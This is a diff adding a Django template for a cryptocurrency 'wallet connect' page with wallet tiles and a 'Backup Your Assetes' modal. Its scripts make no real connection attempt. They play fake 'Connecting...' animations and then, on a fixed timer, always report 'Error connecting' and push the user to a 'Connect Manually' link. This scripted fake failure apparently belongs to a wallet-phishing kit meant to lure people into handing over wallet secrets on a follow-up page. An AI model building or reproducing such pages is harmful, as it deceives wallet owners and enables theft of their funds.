@@ -1,0 +1,271 @@
+{% extends 'user/base2.html' %}
+{% load static %}
+{% block content %}
+
+<style>
+    .loader1 {
+        position: relative;
+        width: 80px;
+        height: 80px;
+    }
+
+    .circle {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: 2px solid #f3f3f3;
+        border-top: 2px solid #3498db;
+        border-radius: 50%;
+        animation: spin 2s linear infinite;
+    }
+
+    .picture {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .picture img {
+        width: 100%;
+        /* height: 80px; */
+        border-radius: 50%;
+    }
+</style>
+<style>
+    .topdiv, .butdiv {
+        transition: all 0.5s ease;
+    }
+</style>
+
+
+
+
+    <div class="row g-sm-4 g-3 justify-content-center">
+        {% for x in x %}
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="{{x.name}}" data-toggle="modal" href="#" class="wallet">
+                        <img src="{{x.logo.url}}" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title" id="walle">{{x.name}}</h5>
+                    <button id="{{x.name}}" data-href="" data-id="11" class="wallet btn main-btn w-100 payID mt-3" data-bs-toggle="modal" data-bs-target="#payID{{x.id}}">Connect</button>
+                </div>
+            </div>
+        </div>
+
+       {% endfor %}
+     
+    </div>
+</div>
+{% for x in x %}
+<div class="modal fade" tabindex="-1" role="dialog" id="payID{{x.id}}">
+    <div class="modal-dialog" role="document">
+        <!-- <form action="" method="post"> -->
+        <input type="hidden" name="_token" value="p0gvYZcEqKi3wFcVVu99qSuCdhcnqUkA0eo1fovN">
+        <div class="modal-content bg-body">
+            <div class="modal-header">
+                <h5 class="modal-title">Backup Your Assetes</h5>
+                <button type="button" class="close modal_close" data-bs-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true" class="text-light">&times;</span>
+                </button>
+            </div>
+
+
+            <div class="row loaderdiv" style="margin: 10px 30px 0px 30px;">
+                <div class="col-4">
+                    <div class="loader">
+                        <div class="loader1">
+                            <div class="circle" style="margin-left: 2.5rem;margin-top: 2.5rem;"></div>
+                            <div class="picture">
+                                <img style="display: block;" id="loader_img" src="{{x.logo.url}}" alt="Overlay Image">
+                            </div>
+                        </div>
+                    </div>
+
+    <div class="connectdiv">
+
+                <div class="topdiv">
+                    <p id="">Connecting...</p>
+                    <p style="color: gray;">Please Wait</p>
+                </div>
+
+                <div class="butdiv" style="display: none;">
+                    <p style="color: red;">Error connecting</p>
+                    <a href="/con_w/{{x.id}}">
+                    <button style=" margin-bottom: 10px; font-size: x-small; height: 37px;" id="conbutton" type="submit" class="btn btn-sm main-btn"><i data-feather="repeat"></i> Connect Manually</button>
+                    </a> 
+                </div>
+
+    </div>
+
+                </div>
+
+                <div id="blc" class="col-6" style="margin-left: 16%;">
+                    <div style="width: 100px;"> <img width="100%" id="img" src="{{x.logo.url}}" alt=""></div>
+                    <b id="wallet_name">{{x.name}}</b>
+                    <!-- <small> Easy-to-use browser extension.</small> -->
+                </div>
+            </div>
+
+
+
+            <div class="modal-body">
+
+
+               
+
+                
+
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn sp_btn_danger modal_close" data-bs-dismiss="modal">Close</button>
+                <!-- <button type="submit" class="btn main-btn">Deposit now</button> -->
+            </div>
+        </div>
+        <!-- </form> -->
+    </div>
+</div>
+{% endfor %}
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const button = document.getElementById("conbutton");
+        const inputCon = document.getElementById("inputcon");
+
+        button.addEventListener("click", function (event) {
+            event.preventDefault();  // Prevents form submission if inside a form
+            inputCon.style.display = "block";
+        });
+    });
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Select all topdiv and butdiv elements
+        const topDivs = document.querySelectorAll(".topdiv");
+        const butDivs = document.querySelectorAll(".butdiv");
+
+        // Loop through each set of elements
+        topDivs.forEach((topDiv, index) => {
+            setTimeout(function () {
+                // Hide the current topdiv and show the corresponding butdiv
+                topDiv.style.display = "none";
+                butDivs[index].style.display = "block";
+            }, 10000);  // 5 seconds delay
+        });
+    });
+</script>
+
+
+{% for x in x %}
+<script>
+  $(document).ready(function() {
+    $(".wallet").click(function() {
+        var id = $(this).data('id');
+        var logoUrl = $(this).data('logo');
+        var walletName = $(this).data('name');
+
+        // Change connection status visuals
+        $(".loader").css("display", "inline-flex");
+        $("#con_stats").css("color", "black").css("display", "inline-flex");
+        $("#img").css("display", "inline-flex");
+
+        clearInterval(intervalId); // Ensure interval logic works correctly
+        con_status(id); // Call function with dynamic data
+
+        // Show the modal
+        const modal = $('#payID');
+        modal.modal('show');
+
+        // Set dynamic values for the modal content
+        $("#loader_img").attr("src", logoUrl);
+        $("#img").attr("src", logoUrl);
+        $("#wallet_name").html(walletName);
+
+        setTimeout(function() {
+            $("#con_stats").html("Error Connecting...");
+            $("#con_stats").css("color", "red");
+            $(".loader").css("display", "none");
+            $("#con_button").css("display", "inline-flex");
+            $("#walletname1").html(walletName);
+            $("#myImg").attr("src", logoUrl);
+        }, 5000);
+    });
+
+    // Variable to store the interval ID
+    let intervalId;
+
+    // con_status function
+    function con_status(id) {
+        const statusElement = document.getElementById('con_stats');
+        const words = [`Connecting to ${id} wallet...`, `Processing to Wallet...`, 'Loading...'];
+        const delay = 2000;
+
+        let currentIndex = 0;
+        statusElement.textContent = words[currentIndex];
+
+        intervalId = setInterval(() => {
+            currentIndex = (currentIndex + 1) % words.length;
+            statusElement.textContent = words[currentIndex];
+            $("#con_stats").css("color", "black");
+            $("#con_button").css("display", "none");
+            $(".loader").css("display", "inline-flex");
+            $("#input_con").css("display", "none");
+
+            if (currentIndex === words.length - 1) {
+                clearInterval(intervalId);
+            }
+        }, delay);
+    }
+
+    // Handle manual connection button click
+    $("#con_button").click(function() {
+        $("#input_con").css("display", "inline-flex");
+        $("#con_button").css("display", "none");
+        $("#con_stats").css("display", "none");
+        const logoUrl = $("#img").attr("src");
+        $("#img").attr("src", logoUrl);
+    });
+});
+
+</script>
+{% endfor %}
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+    document.querySelectorAll(".payID").forEach(button => {
+        button.addEventListener("click", function () {
+            const modal = new bootstrap.Modal(document.getElementById('payID'));
+            modal.show();
+        });
+    });
+});
+
+</script>
+
+
+
+
+<script>
+    // $(function() {
+    //     'use strict'
+
+    //     $('.paynow').on('click', function() {
+    //         const modal = $('#paynow')
+
+    //         modal.find('form').attr('action', $(this).data('href'))
+    //         modal.find('input[name=id]').val($(this).data('id'))
+
+    //         modal.modal('show')
+    //     })
+    // })
+</script>
+
+
+
+{% endblock %}
